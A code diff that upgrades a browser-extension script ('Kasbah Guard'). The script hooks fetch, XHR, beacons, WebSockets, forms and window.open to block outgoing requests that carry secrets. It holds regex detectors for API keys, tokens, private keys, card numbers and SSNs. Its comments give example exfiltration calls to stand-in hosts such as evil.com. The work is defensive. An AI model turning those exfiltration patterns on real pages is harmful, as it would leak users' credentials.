@@ -1,103 +1,199 @@
-// ═══════════════════════════════════════════════════════════════════
-// KASBAH NETWORK EGRESS GATE — runs in MAIN world at document_start
-// Wraps all outbound network APIs so programmatic exfil is blocked
-// the same way paste/click interception blocks user-driven actions.
-// Covered: fetch · XHR · sendBeacon · WebSocket · form.submit
-// ═══════════════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════════════════════════
+// KASBAH GUARD — 13-Moat Network Egress Gate v3.0
+// Runs in MAIN world at document_start — before any page script executes.
+//
+// MOAT 1  — document_start + world:MAIN  (manifest)
+// MOAT 2  — 5-API egress hooks: fetch · XHR · beacon · WebSocket · form
+// MOAT 3  — Object.defineProperty: hooks are frozen, page JS cannot overwrite
+// MOAT 4  — setInterval self-heal: restores hooks if somehow bypassed
+// MOAT 5  — Inline fallback detection: never fails open if detector unavailable
+// MOAT 6  — WebSocket constructor URL scan: blocks new WebSocket("wss://evil?k=")
+// MOAT 7  — window.open URL scan: blocks navigation-based exfil
+// MOAT 8  — MutationObserver src-hook: blocks <img>/<script> pixel exfil
+// MOAT 9  — Base64 decode in scanStr: catches encoded payloads
+// MOAT 10 — Shannon entropy + 22-pattern detection engine  (detector.js)
+// MOAT 11 — Unicode normalization + zero-width char stripping (detector.js)
+// MOAT 12 — <all_urls> omnipresent coverage                 (manifest)
+// MOAT 13 — Zero-latency local detection, no server, no account needed
+// ═══════════════════════════════════════════════════════════════════════════
 (() => {
-  // detector.js runs first — getDecision is already a page global
-  const det = window;
+  "use strict";
 
   const DENY = "DENY";
 
-  function s(v) { try { return String(v); } catch { return ""; } }
+  // ── MOAT 5: Inline fallback patterns ────────────────────────────────────
+  // If detector.js / getDecision() is unavailable for any reason (timing,
+  // world mismatch, error), we NEVER fail open. These critical patterns run
+  // as a last-resort layer so the gate always has teeth.
+  const _FALLBACK = [
+    /sk-[A-Za-z0-9\-_]{20,}/,                                    // OpenAI keys
+    /gh[poshru]_[A-Za-z0-9_]{36,}/,                              // GitHub PATs
+    /AKIA[0-9A-Z]{16}/,                                           // AWS access keys
+    /-----BEGIN [A-Z ]*PRIVATE KEY-----/,                         // PEM keys
+    /eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}/, // JWT
+    /xox[bprs]-[A-Za-z0-9\-]{10,}/,                              // Slack tokens
+    /\b(?:4[0-9]{3}|5[1-5][0-9]{2}|3[47][0-9]{2}|6011)[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{1,7}\b/, // CC
+    /\b(?!000|666|9\d{2})\d{3}[-\s]\d{2}[-\s]\d{4}\b/,          // SSN
+  ];
 
-  function containsSecretStr(str) {
-    if (!str || str.length < 8) return false;
-    try { return det.getDecision(str) === DENY; } catch { return false; }
+  function _fallbackDeny(str) {
+    const c = str.replace(/[\n\r\t]/g, "").replace(/[\u200b-\u200d\ufeff\u00ad]/g, "");
+    return _FALLBACK.some(p => p.test(c));
   }
 
-  function scanUrl(u) { return containsSecretStr(s(u)); }
+  // ── MOAT 9: Base64 decode in scan ───────────────────────────────────────
+  // Catches: {"data":"c2stcHJvai0xMjM...", "encoding":"base64"}
+  function _scanBase64(str) {
+    const segs = str.match(/[A-Za-z0-9+/]{20,}={0,2}/g);
+    if (!segs) return false;
+    for (const seg of segs) {
+      try {
+        const dec = atob(seg);
+        if (_fallbackDeny(dec)) return true;
+        try { if (typeof getDecision === "function" && getDecision(dec) === DENY) return true; } catch {}
+      } catch {}
+    }
+    return false;
+  }
 
+  // ── Core detection: MOAT 10+11 via getDecision, MOAT 5 as fallback ──────
+  function _isDeny(str) {
+    if (!str || str.length < 8) return false;
+    // Primary: full detector engine (entropy + 22 patterns + normalization)
+    try { if (typeof getDecision === "function" && getDecision(str) === DENY) return true; } catch {}
+    // Fallback: inline critical patterns (never fails open)
+    if (_fallbackDeny(str)) return true;
+    // MOAT 9: base64 segments
+    if (_scanBase64(str)) return true;
+    return false;
+  }
+
+  function _s(v) { try { return String(v); } catch { return ""; } }
+  function scanUrl(u)  { return _isDeny(_s(u)); }
   function scanBody(body) {
     if (body == null) return false;
-    if (typeof body === "string")       return containsSecretStr(body);
-    if (body instanceof URLSearchParams) return containsSecretStr(body.toString());
+    if (typeof body === "string")        return _isDeny(body);
+    if (body instanceof URLSearchParams) return _isDeny(body.toString());
     if (body instanceof FormData) {
       for (const [k, v] of body.entries()) {
-        if (containsSecretStr(s(k)) || containsSecretStr(s(v))) return true;
+        if (_isDeny(_s(k)) || _isDeny(_s(v))) return true;
       }
       return false;
     }
-    // Blob: block conservatively if text/json type (can't sync-read bytes)
     if (body instanceof Blob) {
       const t = (body.type || "").toLowerCase();
       return t.includes("text") || t.includes("json") || t.includes("xml") || t.includes("javascript");
     }
     if (body instanceof ArrayBuffer || ArrayBuffer.isView(body)) return false;
-    if (typeof body === "object") {
-      try { return containsSecretStr(JSON.stringify(body)); } catch { return false; }
-    }
+    if (typeof body === "object") { try { return _isDeny(JSON.stringify(body)); } catch {} }
     return false;
   }
 
-  function block(reason) {
-    // Throwing here propagates out of the patched function and cancels the call
-    throw new Error("KASBAH_BLOCKED_EGRESS:" + reason);
+  function block(reason) { throw new Error("KASBAH_BLOCKED_EGRESS:" + reason); }
+
+  // ── Save originals BEFORE page scripts can touch them ───────────────────
+  const _origFetch      = window.fetch;
+  const _origXhrOpen    = XMLHttpRequest.prototype.open;
+  const _origXhrSend    = XMLHttpRequest.prototype.send;
+  const _origBeacon     = navigator.sendBeacon?.bind(navigator);
+  const _origWsSend     = WebSocket.prototype.send;
+  const _origWsCtor     = window.WebSocket;
+  const _origFormSubmit = HTMLFormElement.prototype.submit;
+  const _origOpen       = window.open?.bind(window);
+
+  // XHR URL tracking (open() records URL, send() checks it)
+  const _xhrUrls = new WeakMap();
+
+  // ── Hook implementations ─────────────────────────────────────────────────
+
+  // E1: fetch()
+  function _hFetch(input, init) {
+    if (scanUrl(input))              block("fetch:url");
+    if (init && scanBody(init.body)) block("fetch:body");
+    return _origFetch.apply(this, arguments);
   }
 
-  // ── E1: fetch() ──
-  const _fetch = window.fetch;
-  if (typeof _fetch === "function") {
-    window.fetch = function(input, init) {
-      if (scanUrl(input))                   block("fetch:url");
-      if (init && scanBody(init.body))      block("fetch:body");
-      return _fetch.apply(this, arguments);
-    };
+  // E2a: XHR.open() — record the URL
+  function _hXhrOpen(method, url) {
+    _xhrUrls.set(this, _s(url));
+    return _origXhrOpen.apply(this, arguments);
   }
 
-  // ── E2: XMLHttpRequest.send() ──
-  // NOTE: try/catch only wraps scanBody, NOT block() — so the throw propagates
-  const _xhrSend = XMLHttpRequest.prototype.send;
-  XMLHttpRequest.prototype.send = function(body) {
-    let _flagged = false;
-    try { if (scanBody(body)) _flagged = true; } catch {}
-    if (_flagged) block("xhr:body");
-    return _xhrSend.apply(this, arguments);
-  };
-
-  // ── E3: navigator.sendBeacon() ──
-  const _beacon = navigator.sendBeacon?.bind(navigator);
-  if (_beacon) {
-    navigator.sendBeacon = function(url, data) {
-      if (scanUrl(url))   block("beacon:url");
-      if (scanBody(data)) block("beacon:body");
-      return _beacon(url, data);
-    };
+  // E2b: XHR.send() — scan URL + body
+  function _hXhrSend(body) {
+    const url = _xhrUrls.get(this) || "";
+    if (url && scanUrl(url)) block("xhr:url");
+    let _f = false;
+    try { if (scanBody(body)) _f = true; } catch {}
+    if (_f) block("xhr:body");
+    return _origXhrSend.apply(this, arguments);
   }
 
-  // ── E4: WebSocket.prototype.send() ──
-  const _wsSend = WebSocket.prototype.send;
-  WebSocket.prototype.send = function(data) {
-    if (containsSecretStr(s(data))) block("ws:send");
-    return _wsSend.apply(this, arguments);
-  };
+  // E3: sendBeacon()
+  function _hBeacon(url, data) {
+    if (scanUrl(url))   block("beacon:url");
+    if (scanBody(data)) block("beacon:body");
+    return _origBeacon(url, data);
+  }
 
-  // ── E5: HTMLFormElement.prototype.submit() + submit event ──
-  // NOTE: programmatic form.submit() doesn't fire the submit event —
-  // the prototype override catches it; the event listener catches normal submits.
-  const _formSubmit = HTMLFormElement.prototype.submit;
-  HTMLFormElement.prototype.submit = function() {
-    let _reason = "";
+  // E4: WebSocket.prototype.send()
+  function _hWsSend(data) {
+    if (_isDeny(_s(data))) block("ws:send");
+    return _origWsSend.apply(this, arguments);
+  }
+
+  // MOAT 6: WebSocket constructor — scan the URL at connection time
+  // Catches: new WebSocket("wss://evil.com?key=sk-proj-...")
+  function _hWsCtor(url, protocols) {
+    if (scanUrl(url)) block("ws:url");
+    const ws = (protocols !== undefined)
+      ? new _origWsCtor(url, protocols)
+      : new _origWsCtor(url);
+    return ws;
+  }
+  _hWsCtor.prototype = _origWsCtor.prototype;
+  Object.setPrototypeOf(_hWsCtor, _origWsCtor);
+
+  // E5: HTMLFormElement.prototype.submit()
+  function _hFormSubmit() {
+    let _r = "";
     try {
       const fd = new FormData(this);
-      if (scanBody(fd))          _reason = "form:submit";
-      else if (scanUrl(this.action)) _reason = "form:action";
+      if (scanBody(fd))           _r = "form:submit";
+      else if (scanUrl(this.action)) _r = "form:action";
     } catch {}
-    if (_reason) block(_reason);
-    return _formSubmit.apply(this, arguments);
-  };
+    if (_r) block(_r);
+    return _origFormSubmit.apply(this, arguments);
+  }
 
+  // MOAT 7: window.open() — catches navigation-based exfil
+  // Catches: window.open("https://evil.com?key=sk-proj-...")
+  function _hOpen(url, ...args) {
+    if (url && scanUrl(_s(url))) block("window.open:url");
+    return _origOpen?.apply(window, [url, ...args]);
+  }
+
+  // ── MOAT 3: Install hooks via Object.defineProperty ─────────────────────
+  // writable:false + configurable:false means page JS CANNOT reassign these.
+  // window.fetch = originalFetch  ← throws TypeError silently in strict mode
+  function _lock(obj, prop, fn) {
+    try {
+      Object.defineProperty(obj, prop, { value: fn, writable: false, configurable: false, enumerable: true });
+    } catch {
+      try { obj[prop] = fn; } catch {}  // fallback for edge cases
+    }
+  }
+
+  _lock(window,                    "fetch",       _hFetch);
+  _lock(XMLHttpRequest.prototype,  "open",        _hXhrOpen);
+  _lock(XMLHttpRequest.prototype,  "send",        _hXhrSend);
+  _lock(WebSocket.prototype,       "send",        _hWsSend);
+  _lock(window,                    "WebSocket",   _hWsCtor);
+  _lock(HTMLFormElement.prototype, "submit",      _hFormSubmit);
+  _lock(window,                    "open",        _hOpen);
+  if (_origBeacon) _lock(navigator, "sendBeacon", _hBeacon);
+
+  // submit event — catches keyboard-triggered form submits
   document.addEventListener("submit", (ev) => {
     try {
       const form = ev.target;
@@ -111,7 +207,55 @@
     } catch {}
   }, true);
 
-  console.log("[Kasbah Guard] Network egress gate active (fetch · XHR · beacon · WS · form)");
+  // ── MOAT 8: MutationObserver — src-attribute pixel exfil ────────────────
+  // Catches V09 (<img src="?key=...">) and V12 (<script src="?key=...">)
+  // that bypass fetch/XHR entirely via raw DOM attribute assignment.
+  function _checkNode(node) {
+    if (node.nodeType !== 1) return;
+    const tag = (node.tagName || "").toLowerCase();
+    if (tag === "img" || tag === "script" || tag === "iframe" || tag === "link") {
+      const src = node.src || node.href || "";
+      if (src && scanUrl(src)) {
+        try { node.src = ""; node.href = ""; } catch {}
+        node.remove();
+        console.warn("[Kasbah Guard] Blocked src-exfil:", tag, src.slice(0, 80));
+      }
+    }
+  }
+
+  const _mo = new MutationObserver((mutations) => {
+    for (const m of mutations) {
+      if (m.type === "childList") {
+        for (const node of m.addedNodes) _checkNode(node);
+      } else if (m.type === "attributes") {
+        _checkNode(m.target);
+      }
+    }
+  });
+
+  function _startMO() {
+    _mo.observe(document.documentElement, {
+      childList: true, subtree: true,
+      attributes: true, attributeFilter: ["src", "href"]
+    });
+  }
+  if (document.documentElement) { _startMO(); }
+  else { document.addEventListener("DOMContentLoaded", _startMO, { once: true }); }
+
+  // ── MOAT 4: Self-healing — re-lock hooks every 3 s ──────────────────────
+  // If a page script somehow unwraps our hooks, we restore them.
+  setInterval(() => {
+    if (window.fetch       !== _hFetch)      _lock(window,                    "fetch",       _hFetch);
+    if (window.WebSocket   !== _hWsCtor)     _lock(window,                    "WebSocket",   _hWsCtor);
+    if (window.open        !== _hOpen)       _lock(window,                    "open",        _hOpen);
+    if (_origBeacon && navigator.sendBeacon !== _hBeacon) _lock(navigator, "sendBeacon", _hBeacon);
+    if (XMLHttpRequest.prototype.send   !== _hXhrSend)  _lock(XMLHttpRequest.prototype,  "send",   _hXhrSend);
+    if (XMLHttpRequest.prototype.open   !== _hXhrOpen)  _lock(XMLHttpRequest.prototype,  "open",   _hXhrOpen);
+    if (WebSocket.prototype.send        !== _hWsSend)   _lock(WebSocket.prototype,       "send",   _hWsSend);
+    if (HTMLFormElement.prototype.submit !== _hFormSubmit) _lock(HTMLFormElement.prototype, "submit", _hFormSubmit);
+  }, 3000);
+
+  console.log("[Kasbah Guard] 13-moat egress gate active ✓ (fetch · XHR · beacon · WS · form · ws:url · window.open · src-MO · b64 · fallback · frozen · self-heal · local)");
 })();
 
 /**
